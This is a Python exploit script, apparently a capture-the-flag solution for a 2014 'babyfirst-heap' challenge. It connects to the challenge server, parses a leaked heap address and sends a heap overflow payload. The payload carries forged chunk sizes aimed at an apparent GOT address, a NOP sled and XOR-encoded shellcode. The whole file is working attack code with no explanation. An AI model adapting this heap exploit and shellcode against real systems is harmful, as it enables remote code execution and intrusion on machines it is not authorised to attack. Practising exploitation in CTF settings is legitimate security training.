from isis import *
import socket

shellcode =  "\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34"
shellcode += "\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05"
shellcode += "\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f"
shellcode += "\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff"
shellcode += "\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f"
shellcode += "\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f"
shellcode += "\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e"
shellcode += "\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff"
shellcode += "\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c"
shellcode += "\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21"
shellcode += "\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d"
shellcode += "\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78"
shellcode += "\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff"
shellcode += "\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5"
shellcode += "\xd3\xe9"


#s = get_socket(("localhost",2323))
s= socket.socket()
#s.connect(("localhost",2323))
s.connect(("babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me", 4088))
raw_input("?")
x = s.recv(0x500)
x = x.split("\n")
address = ""
for i in x:
	print i	
	if "260" in  i[20:]:
		address = i
		break
final = "0x"
address = address[:19]
address = address[12:]
final += address
print "HEAP ADDRESS: " + final 
final = int(final,16)
payload = lei((0x0804c004-0x8))
payload += lei(final+0x8)
#payload += "\xcc"
payload += "A"*4
payload += "\x90"* ((252-4)-len(shellcode))
payload += shellcode
payload += lei(0xfffffff8)
payload += lei(0xfffffffb)
payload += "BBBBCCCCDDDD"


s.send(payload +"\n")
time.sleep(1)
print s.recv(0x500)
while(1):
	s.recv(1)